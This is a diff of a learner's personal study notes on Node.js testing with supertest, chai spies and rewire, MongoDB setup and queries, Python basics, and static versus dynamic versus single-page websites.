+          app.get('/bad',(req,res)=>{
+                res.status(404);
+                res.send({
+                    error:'Page Not Found'
+                });
+            });
+            
+           it('should return Page Not Found response',(done)=>{
+                request(app)
+                    .get('/bad')
+                    .expect(404)
+                    .expect({
+                        error:'Page Not Found'
+                    })
+                    .end(done);
+            });
+      
+      Another Example for more flexibility in tests->
+      
+      app.get('/bad',(req,res)=>{
+            res.status(404);
+            res.send({
+                error:'Page Not Found',
+                name: 'Todo App v1.0'
+            });
+        });
+      
+      it('should return Page Not Found response',(done)=>{
+            request(app)
+                .get('/bad')
+                .expect(404)
+                .expect((res)=>{ // Here expect is of supertest // Here in res we will get all the response data such as headers etc
+                    expect(res.body).to.be.a('object').has.a.property('name');      // here expect is of chaiJS
+                })
+                .end(done);
+        });
+      
+      Another Example->
+      app.get('/users',(req,res)=>{
+            res.status(200);
+            res.send([{
+                name:'Sadanand',
+                age:25
+            },{
+                name: 'Andrew',
+                age:26
+            },{
+                name: 'Max',
+                age:27
+            }]);
+        });
+        
+        it('should return User Object response',(done)=>{
+            request(app)
+                .get('/users')
+                .expect(200)
+                .expect((res)=>{
+                    console.log(res.body[0]);
+                    expect(res.body).to.be.a('array');          // we can also make two test cases just like in simple chaijs
+                    expect(res.body[0]).to.be.a('object').have.all.key('name','age');
+                })
+                .end(done);
+        });
+        
+        - describe() -> It lets you group tests together, it is used smae as 'it'
+            Ex-> their are two test cases
+            
+            it('should return hello world response',(done)=>{
+                request(app)
+                    .get('/')
+                    .expect(200)
+                    .expect('Hello World')
+                    .end(done);
+            });
+
+            it('should return Page Not Found response',(done)=>{
+                request(app)
+                    .get('/bad')
+                    .expect(404)
+                    .expect((res)=>{
+                        expect(res.body).to.be.a('object').has.a.property('name');
+                    })
+                    .end(done);
+            });
+        
+        // Now we can wrap up above to test cases into one as
+        
+        describe('Utils test cases',()=>{
+            it('should return hello world response',(done)=>{
+                request(app)
+                    .get('/')
+                    .expect(200)
+                    .expect('Hello World')
+                    .end(done);
+            });
+
+            it('should return Page Not Found response',(done)=>{
+                request(app)
+                    .get('/bad')
+                    .expect(404)
+                    .expect((res)=>{
+                        expect(res.body).to.be.a('object').has.a.property('name');
+                    })
+                    .end(done);
+            });
+
+        });
+        // using describe in above example we have binded testcases 'should return Page Not Found response' and 'should return hello world response'
+        // into one test case of describe 'Utils test cases'
+        
+        -> Describe could be done in nested format also such as
+        
+            describe('Utils test cases',()=>{
+                describe('Utils test case 1',()=>{              // nested describe 'Utils test case 1'
+                    it('should return hello world response',(done)=>{
+                        request(app)
+                            .get('/')
+                            .expect(200)
+                            .expect('Hello World')
+                            .end(done);
+                    });
+                });
+
+                it('should return Page Not Found response',(done)=>{
+                    request(app)
+                        .get('/bad')
+                        .expect(404)
+                        .expect((res)=>{
+                            expect(res.body).to.be.a('object').has.a.property('name');
+                        })
+                        .end(done);
+                });
+
+            });
+
+        - describe is for optional usage means it is not mandatory to use describe , it is upto ur need and usage that how
+            much scalable and readable use wants to make you testcases script
+            
+        - Suppose we need to test following code
+            module.exports.handleSignUp = (email,password)=>{
+                db.saveUser({email,password});
+            };
+            
+            // here the issue is to test handleSignUp we have to also test db.saveUser which is in another file to resolve such
+            // kind of situations we use spies 
+            
+        - For chaiJS spies to explore more go to link->https://github.com/chaijs/chai-spies
+        
+        - now to test the above scenerio for which spies are used we need npm module 'rewire'
+        
+        - To use spies syntax->
+            const chai = require('chai');
+            const spies = require('chai-spies');
+            chai.use(spies);                // binding spies with chai
+            const expect = chai.expect;     
+
+            const rewire = require('rewire');   // rewire will make the copy of the original method or object so the duplicate one will execute during the test case not the original one
+            var app = rewire('./app');          // to rewire app methods and objects so that their duplicate could be made
+
+            var db={
+                saveUser: chai.spy()            // making the duplicate method in another file
+            };
+            app.__set__('db',db);               // passing the properties of db file into this mock db
+
+            let spy = chai.spy();               // creating a spy (not related to this code)
+
+            describe('App', function () {
+
+                it('should call the spy correctly',()=>{
+                    spy();                      // calling a spy
+                    expect(spy).to.have.been.called();  // checked if spy is called or not
+                });
+
+                it('should call saveUser with user Object',()=>{
+                    var email='abc@gmail.com';
+                    var password = 'abcd';
+                    app.handleSignUp(email,password);       //checking testcase the handleSignUp mock method created by rewire to check the inputs
+                    expect(db.saveUser).to.have.been.called.with({email,password}); // testcase to check the inputs
+                });
+            });
+            
+   -> MongoDB
+   Steps to setup mongoDB
+   - Install mongodb msi installer
+   - go to placewhere mongodb folder is created and mongdodb installed in Program Files such as C:\Program Files\MongoDB\Server\4.0
+   - dir
+   - cd bin
+   - dir
+   - Create a directory to store the mongodb data
+   - in cmd prmpt navigate to directory -> C:\Program Files\MongoDB\Server\4.0\bin
+   - in cmd prmpt->mongod.exe --dbpath path_of_directory_to_store_data // this will start the mongodb server
+   - in another cmd prmpt navigate to C:\Program Files\MongoDB\Server\4.0\bin
+   - then in cmd prmpt -> mongo.exe \\ this will connect to local mongodb database
+   - now in the terminal -> db.Todos.insert({test: 'Anything'}) // this will create a collection of name Todos and insert data.
+   - db.Todos.find() \\ to find data in Todos Collection
+   - then download robomongo from here ->https://robomongo.org/download //Robomongo is basically a GUI for the mongodb
+   - after install the dashboard of robomongo will be open
+   - on Dasbboard->
+        - click 'create' write the connection configurations and then Save
+        - on the dashboard select your connection and start working
+        
+   - In NoSql the term Collection is same as table in SQL and the term 'Document' is used in place of Row/Record.
+   
+   - Unrelated -> npm install mongodb@2.2.5 --save
+        const MongoClient = require('mongodb').MongoClient;
+        //MongoClient.connect(url,callback); // url for the db to be connected , callback for the connection succed or fail
+        MongoClient.connect('mongodb://localhost:27017/TodoApp',(err,client)=>{
+            if(err){
+                return console.log('Unable to connect to mongoDB server')
+            }
+            console.log('Connected the MongoDB server');
+            const db = client.db('TodoApp');
+            db.collection('Todos').insertOne({
+                text:'Something to do',
+                completed: false
+            },(err,result)=>{
+                if(err){
+                    return console.log('Unable to insert todo ',err);
+                }
+                console.log(JSON.stringify(result.ops,undefined,2))
+            });
+
+            client.close();
+        });
+        
+        - the object id for every document is unique in a collection we can define the object id for a document by us also
+            , in '_id' we just need to put id otherwise it will create id by itself.
+            
+       - const MongoClient = require('mongodb').MongoClient; // to destructure the call of the package is as follows
+            const {MongoClient} = require(mongodb);
+            
+       - To get object ids created by mongodb
+       const {MongoClient, ObjectID} = require('mongodb');
+
+        var obj = new ObjectID();
+        console.log('Object ID ',obj);
+        
+      - To Find the data in Collection
+        // const MongoClient = require('mongodb').MongoClient;
+        const {MongoClient, ObjectID} = require('mongodb');
+
+        var obj = new ObjectID();
+        console.log('Object ID ',obj);
+
+        MongoClient.connect('mongodb://localhost:27017/TodoApp',(err,client)=>{
+            if(err){
+                return console.log('Unable to connect to mongoDB server')
+            }
+
+            const db = client.db('TodoApp');
+            db.collection('Users').find().toArray().then((docs)=>{
+                console.log('Todos');
+                console.log(JSON.stringify(docs, undefined, 2));
+            },(err)=>{
+                console.log('Unable to fetch Todos ',err);
+            });
+
+            //client.close();
+        });
+
+   -  db.collection('Users').find({age: 25}).toArray().then((docs)=>{       // to find data based on query such as here find data for document who's age is 25
+            console.log('Todos');
+            console.log(JSON.stringify(docs, undefined, 2));
+        },(err)=>{
+            console.log('Unable to fetch Todos ',err);
+        });
+   
+   - 
+   
+---------------------------------------------------------------------------------------------------------------   
+   1https://www.youtube.com/watch?v=Ozrduu2W9B8&list=PL4cUxeGkcC9idu6GZ8EU_5B6WpKTdYZbK
+
+- Every thing in python is considered objects, and objects r attributes of functions
+- Numbers->
+  - their r 2 two types of no. integer and float
+  - type(object) # to find the type of an object
+  - in python 5 / 5 = 1.0 # this is only for division
+  - to get the integer value at the time if division do: 5 // 5 = 1 # we use double forward slash
+  - power of operation is done as 5 ** 2 = 25
+  - in python we use the order of calculation as BIDMAS # I here stands for indeces which anything like power off such as **
+
+- Strings->
+  - 'he's a mad man' # this will give an error as if u start with single quote then it should end with single quote
+  - So "he's a mad man" # this is correct
+  - otherway 'he\'s a mad man' # we use \ to escape a character here we have used to escape ' after he
+  - greet = 'hello'
+    So greet[3] o/p is 'l' same as JavaScript
+    greet[-1] o/p is 'o' the python works backward also but Javascript does not
+    So greet[-5] o/p is 'h'
+    but greet[-6] will give us IndexError: string index out of range
+  - Slicing : greet[0:3] o/p is 'hel'
+   greet[-1:2] o/p is empty string bcz we can only go forward not backward
+   So we can do greet[2:-1] o/p is 'll'
+  - repeating a string if we do: greet * 2 o/p is 'hellohello'
+  - greet.upper() # for upper case
+  - name = "aaa, bbb, ccc"
+     name.split(',') o/p is ['aaa', ' bbb', ' ccc'] it split the string when ever it find ',' and convert it into list
+  - len(greet) o/p is 5  # to find the length of string
+
+- Lists ->
+  - In python array is called List
+  - fib1 = [1,2,3]
+  -  fib1[1] o/p is 2
+  -  fib1[-1] o/p is 3
+  -  fib1[0:2] o/p is [1,2]
+  -  fib2 = [4,5,6]
+   - fib1 + fib2 o/p is [1,2,3,4,5,6]
+   - fib1.append(7) o/p is [1,2,3,7] # it works same as push() in JavaScript
+   - fib1.pop() o/p is 7 as it removed the last element and now if we do fib1 then o/p is [1,2,3]
+   - fib1.remove(2) o/p is [1,3] but their is problem suppose we have array as fib1 = [1,2,2,3] and  then we do fib1.remove(2) so it only
+   remove one '2' and it removes the first '2' means the 2 of index 1.
+   - fib1 = [1,2,3] and we do del(fib1[2]) then o/p is [1,2]
+   - list of different datatypes is also allowed as fib1 = ['a','b',1,2] is ok to do
+   - nested lists ,so fib1 = [1,2,3] and we can do fib2 = ['a','b', fib1, [4,5]] is ok and this would be shown as
+      ['a', 'b', [1, 2, 3], [4, 5]]
+      So if we do fib2[0] o/p is 'a' and if we do fib2[2] o/p is [1,2,3]
+      if we do fib2[2][1] o/p is 2
+
+
+   - For Loops
+      ninjas = ['ryu', 'crystal' ,'yoshi', 'ken']
+
+      for ninja in ninjas:
+        print(ninja)        # prints all the elements
+
+      for ninja in ninjas[1:3]:         # here we r slicing the array
+        print(ninja)
+        # o/p will be
+        crystal
+        yoshi
+
+   - While Loops
+
+        age = 25
+        num = 0
+
+        while num < age:
+          # block of code
+          # break           # to break the loop
+          # continue        # to go to he next iteration with proceeding further
+          num += 1
+
+    - Range -> range just creates a list of no.s till the no.s defined in it
+
+        for n in range(5):
+          print(n)      o/p -> 0 1 2 3 4
+
+       we can define a starting point too such as
+
+        for n in range(3,5):
+          print(n)      o/p -> 3 4
+
+       we can define the values with it can increase such as in above ex's it is increasing by one be can it also increase by 2
+
+       for n in range(0,20,4):      # here 3rd argument is telling the updation by value
+          print(n)      o/p -> 0 4 8 12 16
+
+       we can use ranges with lists also
+
+       alph = ['a','b','c','d','e']
+
+       for n in range(len(alph)):
+        print(n, alph[n])
+
+        o/p -> 0 a
+              1 b
+              2 c
+              3 d
+              4 e
+
+        we can go backwards through the list also
+
+
+       alph = ['a','b','c','d','e']
+
+       for n in range(len(alph)-1,-1,-1):         # here in 3rd arg we put -1 bcz we need to go back and in 1st arg we r starting with
+        print(n, alph[n])                         # last element 'e' and 2nd argument is referring to 'e' as index -1 but we have to 'a'
+                                                  # as the index their is not included that's why we are entering -1 which is index of 'e'
+        o/p -> 4 e                                # and this way the 'a' will also be get included
+              3 d
+              2 c
+              1 b
+              0 a
+
+
+
+    - Dictionaries -> These r same as JSON objects in JavaScript and values r stored in them in key value pairs
+        Ex: ninja_belt = {
+          'crystal': 'red',
+          'ryu': 'black'
+        }
+
+        ninja_belt['crystal']  o/p is red
+
+        - to check if key is in dictionary or not:
+
+        'crystal' in ninja_belt  o/p True
+
+        - to know the keys in a dictionary
+
+        ninja_belt.keys()  o/p is  dict_keys(['crystal','ryu']) # here dict_keys is a predefined variable containing all keys
+
+        - to only get above o/p in array format we can do type cast with 'list'
+
+        list(ninja_belt.keys())   o/p is ['crystal','ryu']
+
+        - now we wanna know all the values in a Dictionary then we can do
+
+        ninja_belt.values()  o/p is  dict_values(['red','black']) # here dict_values is a predefined variable containing all values
+
+        - we can do the same list type cast over on values
+
+        list(ninja_belt.values())   o/p is ['red','black']
+
+        - we can check how many instances of a particular values is in dictionary
+
+        vals = list(ninja_belt.values())   o/p is ['red','black']
+
+        vals.count('black')   o/p 1
+
+        - if we use a value which does not exit then we will get o/p 0
+
+        vals.count('blue')   o/p 0
+
+        - we can also add the key and value to a already defined dictionary as
+
+        ninja_belt['yoshi'] = 'blue'
+
+        ninja_belt   o/p  ninja_belt = {
+                            'crystal': 'red',
+                            'ryu': 'black',
+                            'yoshi': 'blue'
+                          }
+
+         - another way to define a dictionary
+
+         person = dict(name='Sadanand',age=25,height='6ft')
+
+         person o/p       person = {
+                            'name': 'Sadanand',
+                            'age': 25,
+                            'height': '6ft'
+                          }
+
+         - for loop for dictionary
+
+         for key, val in dictionary.items():
+            print(key , val)
+
+    - Sorting and Sets ->
+
+      nums = [1,4,2,3,3,2,4,5,5]
+
+      to sort them we use sorted() as sorted(nums)
+      we can use these of strings list too as alphs = [d,g,A,h,B,a]
+      sorted(alphs) o/p [A,B,a,d,g,h]  # here 'a' comes after 'B' bcz in python capital letters comes first
+
+      set() is used to remove the duplicate data
+
+      as set(nums) o/p [1,4,2,3,5]  # and set does not preserve order in alphabets but order is preserved in numbers
+
+      - we can apply set on dictionary also
+
+      ninja_belt = {
+                    'crystal': 'red',
+                    'ryu': 'black',
+                    'yoshi': 'black'
+                  }
+
+      set(ninja_belt.values()) o/p is {'red','black'}
+
+  ---------------------------------------------------------------------------------------------------------------
+
+
+
+1) Dynamic vs Static vs SPA
+
+Detailed info link -> https://www.academind.com/learn/web-dev/dynamic-vs-static-vs-spa/
+
+Static Websites ->
+Bunch of HTML files r put on the server, and on that server the pages r served to the users, ScreenShot(53), So if user enters urcoolpage.com
+or urcoolpage.com/something then u get the different HTML files served back
+This is the oldest approach for building a website
+
+Dynamic Website -> ScreenShot(54)
+In this the HTML code that u r getting back in the response is rendered on the fly, per request on the server
+As in the static website approach u simply write HTML code and put it on the server, u couldn't build things like online shops or blogs in
+which whenever u needed a user generate content or u had dynamic content that change alot such as u wanted to show what's in the shopping cart
+won't be possible as u don't know what the user puts in the cart and so we needed a solution in where the HTML files r generated on the server
+and then returned to the users, which means u need some server side language such as NodeJS, PHP, Python etc, In which the incoming request will
+be parsed and handled by the server side code which then reach out to the data base and fetch some data from their and then stich all these
+things together and build HTML code on the server, So as a developer u define a template and define in it where the dynamic spots r in the
+template and where that dynamic data should go into, which is done by templating engine such as blade or laravel, ejs, pug, handlebar etc.
+and then after theis the server put all these pieces together and then send a finished HTML page together, and that dynamic spots allow u to
+generate different pages for different requests
+
+SPA(Single Page Application) ->
+This is currently the most modern way and it is inspired by the mobile apps, In this we donot need to wait for the page to load, the spinner
+or buffer sign is their occasionally but it is when the data is being fetched, but in general we remain in that app experience as instantly
+when we click somewhere we get the page and we wanted this same experience to the browsers as well bcz in dynamic website approach everytime
+when we clicks that loads a new page results in a new request and new response and the page being genrated on the server and although the
+modern engines r really fast but still their is slight delay bcz we might need a new page when no dynamic content change such as if we
+need to go to the contact page
+
+So in SPA's the idea is that u have a one single HTML file that sits on the server and then only that one file is returned back to the user,
+but in that one file the core thing that happens is that the bunch of Javascript is loaded and started and then that JS code executes, and
+fetches data from the server and build the entire HTML page(DOM) what the user sees on to the fly to the browser, So not on the server any
+more but in the browser, the advantage of that is the JS which runs to the browser and everything that we see is on the browser the things
+happens instantly, as their is no additional requests that needs to be send to load a new page, occasionally their r requests to fetch
+new data
+
+Although SPA's r most commonly used these days but still other two approaches Static and Dynamic r still not old and outdated, such as if
+u have a very simple page with no dynamic content, such as ur personal home page where u update ur resume once a year, then u can build
+a bunch of HTML files with little bit of JS and deploy that to a server, but if u have the content which updates very frequently then u
+can used the tools called static site generators where u have some data source(Database), then the generator is run by U to start the
+generation process and then generator look at ur data sources fetches the data, takes ur predefined HTML frames then insert the data in it
+and then spits out a bunch of pre-generated HTML files remember they r not generated on the server but on ur machine or may be on the
+cloud but not as the part of the incoming requests but before the page is deployed and then u deploy that finished static page on to the
+server
+The great thing is that their r even solutions such as getspeedJS which allows u to build a react app, and then when u build it as a static
+site, the getspeed visits every page that user could visit and pre-generate that HTML page by taking a snapshot but then what u deploy is
+actually both the static page and SPA, So no matter which page u load ,
+Real World Example of getspeed -> https://www.academind.com/learn/web-dev/dynamic-vs-static-vs-spa/
+Here u load the finished page the finished HTML code, but once it is loaded a SPA takes over and executes, bcz of which u have fast mobile
+like experience
+
+For Dynamic sites, such as u r building an online shop where both search engine optimization as well as dynamic content is present then the
+dynamic page is perfect bcz SPA often have a problem with search engine optimization as the search engine crawlers don't necessary wait for
+the JS running on the browser to complete rendering, specially when u first need to fetch some content from inside ur JS code and therefore
+search engine optimization can be a problem with SPA's, bcz in the dynamic u fetch the page which is finished already, So the crawler sees
+what the user sees and all the heavy lifting happens on the server and this way u don't affect the performance of the app when it runs in
+the users browser, therefore in the dynamic sites where the content is generated per request basis on the server
+
+Pros and Cons Comparision between Dynamic, Static and SPA's -> Screenshot(55)
+
+2)
+
+
+---------------------------------------------------------------
+        
+        
+        
+        
+        
+      
+      
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+
+
+	 
+	 
+	 
+	 
+	 
+
+   
+   
+   
